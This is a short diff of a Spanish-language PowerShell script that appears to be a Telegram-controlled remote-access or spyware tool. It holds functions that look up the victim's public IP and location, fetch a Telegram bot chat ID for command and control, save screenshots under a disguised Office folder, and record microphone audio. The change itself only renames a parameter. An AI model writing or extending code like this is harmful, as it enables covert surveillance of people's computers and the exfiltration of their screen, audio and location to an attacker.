@@ -89,7 +89,7 @@ $datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json  | ConvertFro
  "Pais" = $datos_ip_publica.country
  "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pais, Ciudad}
 function bot-public {param($botkey) $getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" ; $Obtenemos_datos_actualizados = (invoke-WebRequest -Uri $getUpdatesLink -Method post).content ; $Obtenemos_datos_actualizados = $Obtenemos_datos_actualizados -split "," ; $chat_id =  $Obtenemos_datos_actualizados | Select-String "chat"; $chat_id = $chat_id[0] -replace '"chat":{"id":' ; $chat_id_result = New-Object psobject -Property @{"chat_id"= $chat_id} ; $chat_id_result | Select-Object chat_id}
-function screen-shot {param ($botkey,$chat)
+function screen-shot {param ($botkey,$chat_id)
 
 $ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office\" + "screenshot.png"
 
@@ -143,7 +143,7 @@ function test-command {param ($comando,$texto,$botkey,$chat_id,$first_connect,$h
 }
 
 
-function graba-audio { param ($botkey,$chat,$segundos)
+function graba-audio { param ($botkey,$chat_id,$segundos)
 $ruta = $env:USERPROFILE + "\AppData\Local\temp\1"
 $audio = $ruta + "\" + "audio.wav"
 if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
